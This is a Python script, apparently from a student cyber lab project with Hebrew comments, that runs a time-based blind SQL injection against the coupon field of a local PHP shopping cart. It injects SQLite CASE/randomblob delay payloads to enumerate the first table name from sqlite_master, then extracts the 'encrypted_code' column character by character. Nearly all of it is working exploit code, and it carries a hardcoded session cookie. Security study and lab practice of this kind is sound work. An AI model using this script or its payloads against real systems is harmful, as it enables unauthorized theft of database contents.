import requests
import time

# כתובת האתר והעוגיות (Session ID)
URL = "http://localhost/CyberProject/cart.php"
COOKIES = {'PHPSESSID': 'p36d9sfpspku81ps8am2fdckbb'}
ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_!@#"

def get_baseline():
    print("[+] Measuring server baseline response time...")
    try:
        start = time.time()
        requests.post(URL, data={"coupon_code": "test", "apply_coupon": "1"}, cookies=COOKIES)
        return time.time() - start
    except Exception as e:
        print(f"[!] Baseline measurement failed: {e}")
        return 0.1

def check_condition_time(payload, baseline):
    # we added randomblob to make the server slower so we will know we have SQL injection
    time_delay_query = f"CASE WHEN ({payload}) THEN randomblob(250000000) ELSE 1 END"
    
    data = {
        "coupon_code": f"' OR ({time_delay_query}) --",
        "apply_coupon": "1"
    }
    
    start = time.time()
    try:
        requests.post(URL, data=data, cookies=COOKIES)
        duration = time.time() - start
        return duration > (baseline + 0.5)
    except Exception as e:
        return False

def discover_table_name(baseline):
    print("[+] Discovering table name from sqlite_master...")
    table_name = ""
    pos = 1
    
    while True:
        found_char = False
        for char in ALPHABET:
            payload = f"UPPER(SUBSTR((SELECT name FROM sqlite_master WHERE type='table' LIMIT 1), {pos}, 1)) = '{char}'"
            if check_condition_time(payload, baseline):
                table_name += char
                print(f"[TABLE ENUM] Position {pos}: {char} -> {table_name}")
                found_char = True
                break
        
        if not found_char:
            break
        pos += 1
    return table_name

def leak_data_unlimited(table, column, baseline):
    discovered = ""
    pos = 1
    print(f"\n[+] Starting Attack on {table}.{column}...")

    while True:
        found_char = False
        for char in ALPHABET:
            payload = f"UPPER(SUBSTR((SELECT {column} FROM {table} LIMIT 1), {pos}, 1)) = '{char}'"
            if check_condition_time(payload, baseline):
                discovered += char
                print(f"[DATA ENUM] Position {pos}: {char} -> Current: {discovered}")
                found_char = True
                break
        
        if not found_char:
            print(f"[+] End of string reached at position {pos}.")
            break
        pos += 1
            
    return discovered

if __name__ == "__main__":
    baseline_time = get_baseline()
    if baseline_time == 0: baseline_time = 0.1
    print(f"[+] Baseline: {baseline_time:.2f}s. Threshold: {(baseline_time + 0.5):.2f}s")

    table_name = discover_table_name(baseline_time)
    
    if table_name:
        print(f"\n[!] Success! Found table: {table_name}")
        choice = input(f"Do you want to extract data from table '{table_name}'? (Y/N): ").strip().upper()
        
        if choice == 'Y':
            extracted = leak_data_unlimited(table_name, "encrypted_code", baseline_time)
            
            if extracted:
                print(f"\n[SUCCESS] Final Data Discovered: {extracted}")
            else:
                print("\n[!] Failed to extract data content.")
        else:
            print("\n[.] Attack aborted by user.")
    else:
        print("\n[!] Failed to discover table name.")